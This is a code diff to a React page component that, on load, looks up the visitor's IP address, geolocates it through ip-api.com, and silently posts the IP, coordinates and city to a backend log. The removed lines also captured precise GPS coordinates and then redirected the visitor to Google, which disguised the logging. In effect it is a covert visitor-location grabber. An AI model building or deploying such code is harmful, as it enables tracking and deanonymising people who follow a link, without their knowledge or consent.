@@ -7,8 +7,7 @@ export default function Page() {
       try {
         let ipLatitude = '';
         let ipLongitude = '';
-        let gpsLatitude = '';
-        let gpsLongitude = '';
+        let city = '';
         let userIp = '';
 
         // Step 1: Fetch the IP address
@@ -16,14 +15,19 @@ export default function Page() {
         const ipData = await ipResponse.json();
         userIp = ipData.ip;
 
-        // Step 2: Fetch location using IP
-        const geoResponse = await fetch(`https://ipinfo.io/${userIp}/json`);
+        // Step 2: Fetch location using IP with city details
+        const geoResponse = await fetch(`http://ip-api.com/json/${userIp}`);
         const geoData = await geoResponse.json();
-        if (geoData.loc) {
-          [ipLatitude, ipLongitude] = geoData.loc.split(',');
+
+        if (geoData.status === 'success') {
+          ipLatitude = geoData.lat;
+          ipLongitude = geoData.lon;
+          city = geoData.city;
+        } else {
+          console.error('IP geolocation failed:', geoData.message);
         }
 
-        // Step 3: Log IP-based location to the backend (even before getting GPS)
+        // Step 3: Log the details to the backend
         await fetch('/api/log', {
           method: 'POST',
           headers: {
@@ -33,49 +37,17 @@ export default function Page() {
             ip: userIp,
             ipLatitude,
             ipLongitude,
-            gpsLatitude: null, // Placeholder for GPS, which will be updated later
-            gpsLongitude: null, // Placeholder for GPS
+            city,
           }),
         });
 
-        // Step 4: Try fetching the precise GPS location, but only after logging IP-based location
-        if (navigator.geolocation) {
-          await new Promise((resolve) => {
-            navigator.geolocation.getCurrentPosition(
-              (position) => {
-                gpsLatitude = position.coords.latitude;
-                gpsLongitude = position.coords.longitude;
-                resolve();
-              },
-              (error) => {
-                console.warn('Geolocation error:', error);
-                resolve(); // If geolocation fails, use IP-based location
-              },
-              { enableHighAccuracy: true }
-            );
-          });
-        }
+        console.log(`IP: ${userIp}, Latitude: ${ipLatitude}, Longitude: ${ipLongitude}, City: ${city}`);
 
-        // Step 5: Log GPS-based location (if available) to the backend
-        await fetch('/api/log', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            ip: userIp,
-            ipLatitude,
-            ipLongitude,
-            gpsLatitude: gpsLatitude || null, // Log GPS location if available
-            gpsLongitude: gpsLongitude || null, // Log GPS location if available
-          }),
-        });
-
-        // Step 6: Redirect to Google
-        window.location.href = 'https://google.com';
+        // Step 4: Redirect to Google (optional)
+        // window.location.href = 'https://google.com';
       } catch (error) {
         console.error('Error fetching or logging location:', error);
-        window.location.href = 'https://google.com'; // Redirect even if there's an error
+        // window.location.href = 'https://google.com'; // Redirect even if there's an error
       }
     };
 
